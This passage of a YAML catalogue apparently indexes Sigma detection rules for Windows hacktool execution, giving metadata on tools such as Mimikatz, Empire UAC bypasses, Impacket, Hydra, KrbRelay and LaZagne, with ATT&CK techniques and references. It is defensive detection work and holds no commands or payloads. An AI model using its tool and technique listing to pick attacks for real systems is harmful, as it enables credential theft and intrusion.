  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165
  - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191
  - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178
  - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64
  false_positives:
  - Other tools that incidentally use the same command line parameters
  notes: ''
- detection_id: 3268b746-88d8-4cd3-bffc-30077d02c787
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_empire_powershell_uac_bypass.yml
  name: HackTool - Empire PowerShell UAC Bypass
  description: Detects some Empire PowerShell UAC bypass methods
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - car.2019-04-001
  time_window: ''
  references:
  - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64
  - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64
  false_positives:
  - Unknown
  notes: ''
- detection_id: a197e378-d31b-41c0-9635-cfdf1c1bb423
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_evil_winrm.yml
  name: HackTool - WinRM Access Via Evil-WinRM
  description: Adversaries may use Valid Accounts to log into a computer using the
    Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on
    user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.006
  tags:
  - attack.lateral-movement
  - attack.t1021.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm
  - https://github.com/Hackplayers/evil-winrm
  false_positives:
  - Unknown
  notes: ''
- detection_id: 24e3e58a-646b-4b50-adef-02ef935b9fc8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_execution_via_imphashes.yml
  name: Hacktool Execution - Imphash
  description: Detects the execution of different Windows based hacktools via their
    import hash (imphash) even if the files have been renamed
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1588.002
  tags:
  - attack.credential-access
  - attack.resource-development
  - attack.t1588.002
  - attack.t1003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate use of one of these tools
  notes: ''
- detection_id: 37c1333a-a0db-48be-b64b-7393b2386e3b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_execution_via_pe_metadata.yml
  name: Hacktool Execution - PE Metadata
  description: Detects the execution of different Windows based hacktools via PE metadata
    (company, product, etc.) even if the files have been renamed
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1588.002
  tags:
  - attack.credential-access
  - attack.resource-development
  - attack.t1588.002
  - attack.t1003
  time_window: ''
  references:
  - https://github.com/cube0x0
  - https://www.virustotal.com/gui/search/metadata%253ACube0x0/files
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9082ff1f-88ab-4678-a3cc-5bcff99fc74d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_gmer.yml
  name: HackTool - GMER Rootkit Detector and Remover Execution
  description: Detects the execution GMER tool based on image and hash fields.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - http://www.gmer.net/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ca621ba5-54ab-4035-9942-d378e6fcde3c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_handlekatz.yml
  name: HackTool - HandleKatz LSASS Dumper Execution
  description: Detects the use of HandleKatz, a tool that demonstrates the usage of
    cloned handles to Lsass in order to create an obfuscated memory dump of the same
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/codewhitesec/HandleKatz
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_hashcat.yml
  name: HackTool - Hashcat Password Cracker Execution
  description: Execute Hashcat.exe with provided SAM file from registry of Windows
    and Password list to crack against
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1110.002
  tags:
  - attack.credential-access
  - attack.t1110.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat
  - https://hashcat.net/wiki/doku.php?id=hashcat
  false_positives:
  - Tools that use similar command line flags and values
  notes: ''
- detection_id: 85d23b42-9a9d-4f8f-b3d7-d2733c1d58f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_hollowreaper.yml
  name: HackTool - HollowReaper Execution
  description: 'Detects usage of HollowReaper, a process hollowing shellcode launcher
    used for stealth payload execution through process hollowing.

    It replaces the memory of a legitimate process with custom shellcode, allowing
    the attacker to execute payloads under the guise of trusted binaries.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.012
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055.012
  time_window: ''
  references:
  - https://github.com/vari-sh/RedTeamGrimoire/tree/b5e7635d34db6e1f0398d8847e8f293186e947c5/HollowReaper
  false_positives:
  - Unknown
  notes: ''
- detection_id: f5e3b62f-e577-4e59-931e-0a15b2b94e1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_htran_or_natbypass.yml
  name: HackTool - Htran/NATBypass Execution
  description: Detects executable names or flags used by Htran or Htran-like tools
    (e.g. NATBypass)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.command-and-control
  - attack.t1090
  - attack.s0040
  time_window: ''
  references:
  - https://github.com/HiwinCN/HTran
  - https://github.com/cw1997/NATBypass
  false_positives:
  - Unknown
  notes: ''
- detection_id: aaafa146-074c-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_hydra.yml
  name: HackTool - Hydra Password Bruteforce Execution
  description: Detects command line parameters used by Hydra password guessing hack
    tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1110
  - T1110.001
  tags:
  - attack.credential-access
  - attack.t1110
  - attack.t1110.001
  time_window: ''
  references:
  - https://github.com/vanhauser-thc/thc-hydra
  false_positives:
  - Software that uses the caret encased keywords PASS and USER in its command line
  notes: ''
- detection_id: 10c14723-61c7-4c75-92ca-9af245723ad2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_impacket_lateral_movement.yml
  name: HackTool - Potential Impacket Lateral Movement Activity
  description: Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.003
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://github.com/SecureAuthCorp/impacket/blob/8b1a99f7c715702eafe3f24851817bb64721b156/examples/wmiexec.py
  - https://github.com/SecureAuthCorp/impacket/blob/8b1a99f7c715702eafe3f24851817bb64721b156/examples/atexec.py
  - https://github.com/SecureAuthCorp/impacket/blob/8b1a99f7c715702eafe3f24851817bb64721b156/examples/smbexec.py
  - https://github.com/SecureAuthCorp/impacket/blob/8b1a99f7c715702eafe3f24851817bb64721b156/examples/dcomexec.py
  - https://www.elastic.co/guide/en/security/current/suspicious-cmd-execution-via-wmi.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4627c6ae-6899-46e2-aa0c-6ebcb1becd19
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_impacket_tools.yml
  name: HackTool - Impacket Tools Execution
  description: Detects the execution of different compiled Windows binaries of the
    impacket toolset (based on names or part of their names - could lead to false
    positives)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Execution
  techniques:
  - T1557.001
  tags:
  - attack.collection
  - attack.execution
  - attack.credential-access
  - attack.t1557.001
  time_window: ''
  references:
  - https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries
  false_positives:
  - Legitimate use of the impacket tools
  notes: ''
- detection_id: cf0c254b-22f1-4b2b-8221-e137b3c0af94
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_impersonate.yml
  name: HackTool - Impersonate Execution
  description: Detects execution of the Impersonate tool. Which can be used to manipulate
    tokens on a Windows computers remotely (PsExec/WmiExec) or interactively
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1134.003
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1134.001
  - attack.t1134.003
  time_window: ''
  references:
  - https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/
  - https://github.com/sensepost/impersonate
  false_positives:
  - Unknown
  notes: ''
- detection_id: b99a1518-1ad5-4f65-bc95-1ffff97a8fd0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_inveigh.yml
  name: HackTool - Inveigh Execution
  description: Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle
    tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/Kevin-Robertson/Inveigh
  - https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/
  false_positives:
  - Very unlikely
  notes: ''
- detection_id: b222df08-0e07-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_clip.yml
  name: Invoke-Obfuscation CLIP+ Launcher
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4bf943c6-5146-4273-98dd-e958fd1e3abf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline.yml
  name: Invoke-Obfuscation Obfuscated IEX Invocation
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the following code block
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c96fc76-0eb1-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_stdin.yml
  name: Invoke-Obfuscation STDIN+ Launcher
  description: Detects Obfuscated use of stdin to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 27aec9c9-dbb0-4939-8422-1742242471d0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_var.yml
  name: Invoke-Obfuscation VAR+ Launcher
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7eedcc9d-9fdb-4d94-9c54-474e8affc0c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_compress.yml
  name: Invoke-Obfuscation COMPRESS OBFUSCATION
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9c14c9fa-1a63-4a64-8e57-d19280559490
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_stdin.yml
  name: Invoke-Obfuscation Via Stdin
  description: Detects Obfuscated Powershell via Stdin in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: e1561947-b4e3-4a74-9bdd-83baed21bdb5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_clip.yml
  name: Invoke-Obfuscation Via Use Clip
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: ac20ae82-8758-4f38-958e-b44a3140ca88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml
  name: Invoke-Obfuscation Via Use MSHTA
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: e9f55347-2928-4c06-88e5-1a7f8169942e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_var.yml
  name: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0a99eb3e-1617-41bd-b095-13dc767f3def
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_jlaive_batch_execution.yml
  name: HackTool - Jlaive In-Memory Assembly Execution
  description: Detects the use of Jlaive to execute assemblies in a copied PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool
  - https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5cddf373-ef00-4112-ad72-960ac29bac34
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_koadic.yml
  name: HackTool - Koadic Execution
  description: Detects command line parameters used by Koadic hack tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.003
  - attack.t1059.005
  - attack.t1059.007
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/
  - https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js
  - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_krbrelay.yml
  name: HackTool - KrbRelay Execution
  description: Detects the use of KrbRelay, a Kerberos relaying tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://github.com/cube0x0/KrbRelay
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a7664b14-75fb-4a50-a223-cb9bc0afbacf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_krbrelay_remote.yml
  name: HackTool - RemoteKrbRelay Execution
  description: 'Detects the use of RemoteKrbRelay, a Kerberos relaying tool via CommandLine
    flags and PE metadata.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://github.com/CICADA8-Research/RemoteKrbRelay
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 12827a56-61a4-476a-a9cb-f3068f191073
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_krbrelayup.yml
  name: HackTool - KrbRelayUp Execution
  description: Detects KrbRelayUp used to perform a universal no-fix local privilege
    escalation in Windows domain environments where LDAP signing is not enforced
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1550.003
  - T1558.003
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1558.003
  - attack.lateral-movement
  - attack.t1550.003
  time_window: ''
  references:
  - https://github.com/Dec0ne/KrbRelayUp
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c2b86e67-b880-4eec-b045-50bc98ef4844
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_lazagne.yml
  name: HackTool - LaZagne Execution
  description: 'Detects the execution of the LaZagne. A utility used to retrieve multiple
    types of passwords stored on a local computer.

    LaZagne has been leveraged multiple times by threat actors in order to dump credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - risk_scoring_or_weighting
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/AlessandroZ/LaZagne/tree/master
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  - https://cloud.google.com/blog/topics/threat-intelligence/alphv-ransomware-backup/
  - https://securelist.com/defttorero-tactics-techniques-and-procedures/107610/
  - https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/800c0e06571993a54e39571cf27fd474dcc5c0bc/2017/2017.11.14.Muddying_the_Water/muddying-the-water-targeted-attacks.pdf
  false_positives:
  - Some false positive is expected from tools with similar command line flags.
  notes: ''
- detection_id: 6bd75993-9888-4f91-9404-e1e4e4e34b77
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_localpotato.yml
  name: HackTool - LocalPotato Execution
  description: Detects the execution of the LocalPotato POC based on basic PE metadata
    information and default CLI examples
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - cve.2023-21746
  time_window: ''
  references:
  - https://www.localpotato.com/localpotato_html/LocalPotato.html
  - https://github.com/decoder-it/LocalPotato
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 15619216-e993-4721-b590-4c520615a67d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_meterpreter_getsystem.yml
  name: Potential Meterpreter/CobaltStrike Activity
  description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting
    a specific service starting
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1134.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134.001
  - attack.t1134.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
  false_positives:
  - Commandlines containing components like cmd accidentally
  - Jobs and services started with cmd
  notes: ''
- detection_id: a642964e-bead-4bed-8910-1bb4d63e3b4d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml
  name: HackTool - Mimikatz Execution
  description: Detection well-known mimikatz command line arguments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1003.002
  - T1003.004
  - T1003.005
  - T1003.006
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.005
  - attack.t1003.006
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://tools.thehacker.recipes/mimikatz/modules
  false_positives:
  - Unlikely
  notes: ''
- detection_id: fca949cc-79ca-446e-8064-01aa7e52ece5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_pchunter.yml
  name: HackTool - PCHunter Execution
  description: Detects suspicious use of PCHunter, a tool like Process Hacker to view
    and manipulate processes, kernel options and other low level stuff
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
